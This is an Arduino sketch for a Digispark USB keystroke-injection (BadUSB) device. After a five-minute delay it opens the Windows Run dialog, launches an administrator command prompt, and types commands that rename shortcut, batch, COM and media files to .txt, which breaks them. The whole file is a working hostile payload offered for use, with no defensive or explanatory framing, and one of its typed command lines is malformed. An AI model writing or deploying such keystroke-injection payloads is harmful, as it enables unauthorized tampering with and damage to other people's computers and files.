#include<DigiKeyboard.h>
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // Changing File Extension types
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("REN *.DOC.TXT REN *.JPEG *.TXT");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("REN *.LNK *.TXT");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("REN *.MPEG *.TXT");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("REN *.COM *.TXT");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("REN *.BAT *.TXT");
  digitalWrite(1, HIGH);
  for(;;){
    // Zzzzzzzz
  }
}
